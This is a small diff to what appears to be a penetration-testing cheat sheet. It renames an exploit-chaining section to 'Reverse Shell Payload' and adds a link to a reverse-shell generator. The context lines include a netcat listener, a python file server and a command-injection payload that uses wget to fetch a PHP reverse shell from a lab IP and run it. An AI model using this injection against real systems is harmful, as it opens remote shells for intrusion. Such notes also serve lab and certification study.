@@ -1131,9 +1131,9 @@ python3 -m http.server 800
 nc -nlvp 443
 &cmd=wget http://192.168.119.168:800/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php
 ````
-#### Chaining exploits
-##### LFI to RFE
+#### Reverse Shell Payload
 ````
+https://revshells.com/
 ````
 ### Hashing & Cracking
 #### Wordlists that worked
